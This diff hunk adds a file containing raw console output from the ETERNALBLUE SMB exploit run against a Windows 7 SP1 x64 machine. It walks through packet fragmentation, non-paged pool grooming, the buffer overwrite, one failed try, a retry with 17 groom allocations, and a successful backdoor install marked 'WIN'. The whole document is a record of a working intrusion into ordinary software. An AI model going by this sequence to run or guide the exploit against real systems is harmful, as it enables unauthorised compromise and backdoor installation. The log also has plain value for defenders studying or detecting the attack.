@@ -1,0 +1,75 @@
+[*] Connecting to target for exploitation.
+    [+] Connection established for exploitation.
+[*] Pinging backdoor...
+    [+] Backdoor not installed, game on.
+[*] Target OS selected valid for OS indicated by SMB reply
+[*] CORE raw buffer dump (39 bytes):
+0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+0x00000020  50 61 63 6b 20 31 00                             Pack 1.
+[*] Building exploit buffer
+[*] Sending all but last fragment of exploit packet
+    ................DONE.
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Starting non-paged pool grooming
+    [+] Sending SMBv2 buffers
+        .............DONE.
+    [+] Sending large SMBv1 buffer..DONE.
+    [+] Sending final SMBv2 buffers......DONE.
+    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Sending last fragment of exploit packet!
+    DONE.
+[*] Receiving response from exploit packet
+    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] Sending egg to corrupted connection.
+[*] Triggering free of corrupted buffer.
+[*] Pinging backdoor...
+    [+] Backdoor NOT installed
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Trying again with 17 Groom Allocations
+[*] Connecting to target for exploitation.
+    [+] Connection established for exploitation.
+[*] Pinging backdoor...
+    [+] Backdoor not installed, game on.
+[*] Target OS selected valid for OS indicated by SMB reply
+[*] CORE raw buffer dump (39 bytes):
+0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+0x00000020  50 61 63 6b 20 31 00                             Pack 1.
+[*] Building exploit buffer
+[*] Sending all but last fragment of exploit packet
+    ................DONE.
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Starting non-paged pool grooming
+    [+] Sending SMBv2 buffers
+        ..................DONE.
+    [+] Sending large SMBv1 buffer..DONE.
+    [+] Sending final SMBv2 buffers......DONE.
+    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] Sending SMB Echo request
+[*] Good reply from SMB Echo request
+[*] Sending last fragment of exploit packet!
+    DONE.
+[*] Receiving response from exploit packet
+    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] Sending egg to corrupted connection.
+[*] Triggering free of corrupted buffer.
+[*] Pinging backdoor...
+    [+] Backdoor returned code: 10 - Success!
+    [+] Ping returned Target architecture: x64 (64-bit)
+    [+] Backdoor installed
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] CORE sent serialized output blob (2 bytes):
+0x00000000  08 00                                            ..
+[*] Received output parameters from CORE
+[+] CORE terminated with status code 0x00000000
+[*] Loopback: Core thread exit code: 0x00000000
+[*] Loopback: Proxy thread exit code:   0x00000000
